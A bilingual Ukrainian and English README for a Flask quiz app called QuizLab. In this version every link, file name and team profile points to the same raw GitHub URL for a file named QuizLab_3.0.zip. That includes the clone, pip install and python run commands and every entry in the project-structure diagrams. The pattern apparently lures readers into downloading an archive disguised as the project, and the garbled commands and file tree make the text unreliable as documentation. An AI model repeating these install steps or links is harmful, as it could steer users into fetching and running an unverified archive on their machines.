# QuizLab

# [english version](#english-version-1)

_QuizLab — це потужна платформа, основна мета якої — підвищення рівня знань і полегшення роботи викладачів._  
_Цієї мети ми досягаємо завдяки використанню AI-технологій та сучасного дизайну, що робить платформу надзвичайно зручною у користуванні._

___
# Навігація  
- [Як запустити проєкт](#як-запустити)
- [Залежності](#залежності)
- [Структура проєкту](#структура-проєкту)
- [Основні концепції](#основні-концепції)
- [Інформація про команду](#інформація-про-команду)

___
### Як запустити  
**Виконуй усі команди в терміналі Git Bash**

```bash
git clone https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
```

#### Створення віртуального середовища

```bash
python -m venv venv
```

#### Активація віртуального середовища

##### Для Windows

```bash
source venv/Scripts/activate
```

##### Для macOS

```bash
source venv/bin/activate
```

#### Встановлення залежностей

```bash
pip install -r https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
```

#### Запуск проєкту

```bash
python https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
```

___
### Залежності  
Python-залежності:
- Flask
- Flask-Login
- Flask-Mail
- Flask-Migrate
- Flask-Sessions
- Flask-SQLAlchemy
- dotenv
- openai

___
### Технології
- Python
- Sqlite3
- SMTP
- HTML 
- CSS
- JavaScript
- Jinja2
- dotenv
- Visual Studio Code
- API
- git
- GitHub

___
### Структура проєкту

```mermaid
    graph TD
        A[quizlab]
        
        A --> B[api]
        B --> B1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        B --> B2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        B --> B3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        B --> B4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        
        A --> C[create_quiz_app]
        C --> C1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C5[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C6[templates]
        C6 --> C61[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C6 --> C62[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C7[static]
        C7 --> C71[css]
        C7 --> C72[js]
        C72 --> C721[answer]
        C721 --> C7211[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C721 --> C7212[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C72 --> C722[question]
        C722 --> C7221[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C722 --> C7222[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C72 --> C723[quiz]
        C723 --> C7231[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C723 --> C7232[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]

        A --> D[home_app]
        D --> D1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D --> D2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D --> D3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D --> D4[templates]
        D4 --> D41[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D --> D5[static]
        D5 --> D51[css]
        D51 --> D511[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D5 --> D52[js]
        D52 --> D521[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]

        A --> E[Project]
        E --> E1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E5[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E6[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E7[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E8[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E9[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E10[templates]
        E10 --> E101[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E10 --> E102[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E11[static]
        E11 --> E111[css]
        E111 --> E1111[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E11 --> E112[icons]
        E112 --> E1121[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E112 --> E1122[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E11 --> E113[js]
        E113 --> E1131[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E12[instance]
        E12 --> E121[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]

        A --> F[registration_app]
        F --> F1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F5[templates]
        F5 --> F51[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F5 --> F52[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F5 --> F53[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F5 --> F54[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F6[static]
        F6 --> F61[css]
        F61 --> F611[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]

        A --> G[.env]
        A --> H[.gitignore]
        A --> I[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        A --> J[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        A --> K[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
```

___
### Основні концепції

- Реєстрація:
  - Валідація введених користувачем email і пароля
  - Збереження пароля (у захищеному вигляді)
  - Додавання користувача в базу даних Sqlite3
  - Надсилання листа з підтвердженням через SMTP
  - Активація облікового запису після підтвердження
  - Автоматичне перебування в системі протягом сесії

- Вхід:
  - Перевірка облікових даних у базі
  - Порівняння хешованих паролів
  - Налаштування сесії користувача

- Квіз:
  - Frontend → API: користувач надсилає дані (назва, питання, відповіді, налаштування)
  - API → Backend: валідація та обробка
  - Backend: створення об'єкта квізу, збереження в базі
  - Backend → API: повернення метаданих про квіз
  - API → Frontend: відображення квізу в інтерфейсі

- Ключові можливості:
  - Управління сесіями через Flask-Session
  - Підтвердження email перед повноцінним доступом

___
### Інформація про команду
- Петро Микитенко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Назарій Ісаченко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Єгор Галкін: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Давид Петренко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Тимофій Зелений: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Іван Іванов: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Іван Михайлюк: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)


# English version
_QuizLab is powerful platform which main goal is boosting our knowledge and make teachers work easier_
_we can achieve this goal by using ai technologies and modern design that makes our platform very easy to use_

___
# Navigation
- [How to run project](#how-to-run)
- [Dependences](#dependences)
- [Project Structure](#project-structure)
- [Key concepts](#key-concepts)
-  [Information about our team](#information-about-our-team)

___
### How to run
EXECUTE ALL COMMANDS IN THE GIT BASH TERMINAL

```bash
git clone https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
```

#### Creating a Virtual Environment

```bash
python -m venv venv
```

#### Activating the Virtual Environment

##### For Windows

```bash
source venv/Scripts/activate
```

##### For macOS

```bash
source venv/bin/activate
```

#### Installing Dependencies

```bash
pip install -r https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
```

#### Running the Project

```bash
python https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
```

___
### Dependences
python dependencies:
- Flask
- Flask-Login
- Flask-Mail
- Flask-Migrate
- Flask-Sessions
- Flask-SQLAlchemy
- dotenv
- openai

___
### technologies
- Python
- Sqlite3
- SMTP
- HTML
- CSS
- Javascript
- Jinja2
- dotenv
- Visual studio code
- API
- git
- github

___
### Project structure
```mermaid
    graph TD
        A[quizlab]
        
        A --> B[api]
        B --> B1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        B --> B2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        B --> B3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        B --> B4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        
        A --> C[create_quiz_app]
        C --> C1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C5[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C6[templates]
        C6 --> C61[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C6 --> C62[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C --> C7[static]
        C7 --> C71[css]
        C7 --> C72[js]
        C72 --> C721[answer]
        C721 --> C7211[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C721 --> C7212[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C72 --> C722[question]
        C722 --> C7221[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C722 --> C7222[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C72 --> C723[quiz]
        C723 --> C7231[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        C723 --> C7232[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]

        A --> D[home_app]
        D --> D1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D --> D2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D --> D3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D --> D4[templates]
        D4 --> D41[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D --> D5[static]
        D5 --> D51[css]
        D51 --> D511[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        D5 --> D52[js]
        D52 --> D521[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]

        A --> E[Project]
        E --> E1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E5[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E6[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E7[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E8[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E9[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E10[templates]
        E10 --> E101[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E10 --> E102[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E11[static]
        E11 --> E111[css]
        E111 --> E1111[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E11 --> E112[icons]
        E112 --> E1121[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E112 --> E1122[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E11 --> E113[js]
        E113 --> E1131[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        E --> E12[instance]
        E12 --> E121[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]

        A --> F[registration_app]
        F --> F1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F5[templates]
        F5 --> F51[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F5 --> F52[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F5 --> F53[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F5 --> F54[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        F --> F6[static]
        F6 --> F61[css]
        F61 --> F611[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]

        A --> G[.env]
        A --> H[.gitignore]
        A --> I[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        A --> J[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
        A --> K[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
```

___
### Key concepts

- Registration:
  - Validate user input (email, password)
  - store password 
  - Store user in Squlite3 database
  - Send email verification via SMTP
  - Activate account upon email confirmation
  - Automaticly stays logged in during whole session

- Login:
Validate credentials against database
Compare passwords
set up users session state to logged in

- Quiz
Frontend → API: User submits quiz data (title, questions, answers, settings)
API → Backend: Validates and forwards quiz creation request
Backend Processing: Creates quiz object, assigns unique ID, stores in database
Backend → API: Returns created quiz with generated metadata
API → Frontend: Sends complete quiz object back to client
Frontend Rendering: Displays created quiz in editable interface

- Key features:
Session management with Flask-Session (server-side cookies)
Email verification requirement

___
### Information about our team
- Петро Микитенко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Назарій Ісаченко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Єгор Галкін: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Давид Петренко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Тимофій Зелений: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Іван Іванов: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
- Іван Михайлюк: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)